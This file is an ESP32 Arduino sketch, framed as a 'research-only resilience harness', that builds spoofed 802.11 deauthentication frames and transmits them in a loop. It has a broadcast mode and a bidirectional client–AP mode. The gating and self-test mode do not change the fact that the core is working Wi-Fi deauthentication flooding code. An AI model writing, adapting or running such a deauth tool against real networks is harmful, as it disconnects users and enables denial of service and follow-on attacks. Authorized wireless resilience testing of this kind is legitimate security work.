/*
 * medusa_deauth — research-only management-frame resilience harness.
 *
 *   (no target)            Driver-API self-test using a non-targeted,
 *                          locally-administered test identity.
 *   TARGET_BSSID+CHANNEL   Research-only broadcast resilience mode.
 *   + TARGET_CLIENT        Research-only bidirectional resilience mode.
 *
 * A successful API return is not over-the-air or receiver proof. Targeted
 * modes are excluded from the default product and require an isolated,
 * explicitly authorized lab plus controls defined in the threat model.
 */
#include <Arduino.h>
#include <WiFi.h>
#include "esp_wifi.h"
#include "medusa_tx_common.h"

#if defined(__has_include)
#  if __has_include("medusa_target.h")
#    include "medusa_target.h"
#  endif
#endif

#ifndef TARGET_CHANNEL
#define TARGET_CHANNEL 0
#endif
#ifndef TARGET_BSSID
#define TARGET_BSSID { 0, 0, 0, 0, 0, 0 }
#endif

static uint8_t bssid[6] = TARGET_BSSID;
static const uint8_t bcast[6] = { 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF };
static const uint8_t selftest_bssid[6] = { 0x02, 0xde, 0xad, 0xbe, 0xef, 0x01 };
#ifdef TARGET_CLIENT
static uint8_t client[6] = TARGET_CLIENT;
static const bool has_client = true;
#else
static uint8_t client[6] = { 0, 0, 0, 0, 0, 0 };
static const bool has_client = false;
#endif

static uint8_t frA[26];   // primary frame
static uint8_t frB[26];   // reverse direction (unicast mode)

static bool configured() {
  if (TARGET_CHANNEL == 0) return false;
  for (int i = 0; i < 6; i++) if (bssid[i]) return true;
  return false;
}

// da=addr1, sa=addr2, bs=addr3; deauth (0xC0 0x00), reason 0x0007
static void mkframe(uint8_t* f, const uint8_t* da, const uint8_t* sa, const uint8_t* bs) {
  memset(f, 0, 26);
  f[0] = 0xC0; f[1] = 0x00;
  memcpy(f + 4, da, 6); memcpy(f + 10, sa, 6); memcpy(f + 16, bs, 6);
  f[24] = 0x07; f[25] = 0x00;
}


// ---- gated transmission -------------------------------------------------
// Every frame this sketch emits passes medusa_tx_send(), which consults the
// operator's session, scope, rate ceiling and latched stop before the radio
// is touched. Rate and burst come from configuration rather than a hardcoded
// delay(), so changing how hard this pushes needs no rebuild.
static bool tx_session_ready = false;

static void tx_session_start(const uint8_t *target) {
  mcfg_t cfg;
  mcfg_defaults(&cfg);           // replaced by the stored config once NVS is wired
  uint8_t allow[1][MTG_MAC_LEN];
  memcpy(allow[0], target, MTG_MAC_LEN);

  mtg_session_grant_t grant;
  tx_session_ready = medusa_tx_begin(&cfg, MCFG_PROFILE_DEAUTH, allow, 1, false, millis(), &grant);
  if (!tx_session_ready) {
    Serial.println("TX refused: no session (a stop may be latched, or scope is missing).");
    return;
  }
  // Report what was actually granted, not what was asked for.
  Serial.printf("TX session: %lu ms, %u frames/sec, burst %u, gap %u ms\n",
                (unsigned long)grant.duration_ms, (unsigned)grant.rate_per_sec,
                (unsigned)medusa_tx_burst(), (unsigned)medusa_tx_gap_ms());
}

void setup() {
  Serial.begin(115200);
  delay(600);
  Serial.println("\n=== medusa_deauth ===");
  Serial.println("LAWFUL USE ONLY - your own AP / authorized tests.");

  WiFi.mode(WIFI_STA);
  esp_wifi_start();
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_channel(configured() ? TARGET_CHANNEL : 1, WIFI_SECOND_CHAN_NONE);

  if (!configured()) {
    mkframe(frA, bcast, selftest_bssid, selftest_bssid);
    Serial.println("No target -> DRIVER API SELF-TEST (test identity, ch 1).");
    Serial.println("  rc 0x102 = driver rejected   rc 0x0 = driver accepted request (not air proof)");
  } else if (has_client) {
    mkframe(frA, client, bssid, bssid);   // AP -> client
    mkframe(frB, bssid, client, bssid);   // client -> AP
    Serial.printf("RESEARCH-ONLY UNICAST LOAD  client %02X:%02X:%02X:%02X:%02X:%02X <-> AP %02X:%02X:%02X:%02X:%02X:%02X  ch %d\n",
                  client[0], client[1], client[2], client[3], client[4], client[5],
                  bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5], TARGET_CHANNEL);
  } else {
    mkframe(frA, bcast, bssid, bssid);    // AP -> broadcast
    Serial.printf("RESEARCH-ONLY BROADCAST LOAD  AP %02X:%02X:%02X:%02X:%02X:%02X  ch %d (no client set)\n",
                  bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5], TARGET_CHANNEL);
  }
  tx_session_start(bssid);
}

void loop() {
  if (!configured()) {   // gentle self-test
    esp_err_t e = medusa_tx_send(frA, (size_t)26, bssid, millis());
    Serial.printf("esp_wifi_80211_tx rc = 0x%x  %s\n", e,
                  e == 0 ? "-> DRIVER ACCEPTED (receiver not verified)"
                         : (e == 0x102 ? "-> DRIVER REJECTED (stock core)" : "-> other"));
    delay(2000);
    return;
  }

  // Authorized resilience-test loop; unavailable in the default product.
  static uint32_t sent = 0;
  esp_err_t e = ESP_OK;
  for (int i = 0; i < 24; i++) {
    e = medusa_tx_send(frA, (size_t)26, bssid, millis()); sent++;
    if (has_client) { medusa_tx_send(frB, (size_t)26, bssid, millis()); sent++; }
  }
  static uint32_t last = 0;
  if (millis() - last > 500) {
    last = millis();
    Serial.printf("load rc=0x%x submissions=%u  %s\n", e, sent,
                  e == 0 ? "(driver accepted; receiver not verified)" : (e == 0x102 ? "(driver rejected)" : "(driver/queue error)"));
  }
  delay(medusa_tx_pacing_ms());
}
